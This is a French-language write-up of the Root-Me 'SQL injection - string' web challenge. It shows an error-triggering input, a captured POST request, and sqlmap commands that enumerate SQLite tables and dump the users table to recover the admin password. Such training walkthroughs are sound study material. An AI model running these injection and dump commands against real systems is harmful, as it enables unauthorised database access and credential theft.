# SQL injection - string

Page du [challenge](http://challenge01.root-me.org/web-serveur/ch19/)

## Analyse

Depuis l'onglet _Search_, dans les champs `Recherche` j'entre la valeur `'#`? J'obtiens un message d'erreur qui m'indique la vulnérabilité, mais aussi le type de base de données: `Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "#" in /challenge/web-serveur/ch19/index.php on line 150 unrecognized token: "#"`.

En utilisant _BurpSuite_, je récupère la requête POST en RAW, que je copie dans un fichier _req.txt_.

```
POST /web-serveur/ch19/?action=recherche HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge01.root-me.org/web-serveur/ch19/?action=recherche
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

recherche=test
```

## Attaque

Première tentative basique de sqlmap. Malheuresement, cette commande basique n'apporte rien.
```
sqlmap -r req.txt -p recherche --dbms sqlite --dbs
```

On va augmenter le _risk_ et le _level_. Dans le cas d'une base de données _SQLite_, on peut seulement rechercher les tables. Petit à petit, on retrouve l'information recherché, le mot de passe de l'admin.
```
sqlmap -r req.txt -p recherche --dbms sqlite --risk 3 --level 3 --tables
sqlmap -r req.txt -p recherche --dbms sqlite --risk 3 --level 3 -T users --dump
```
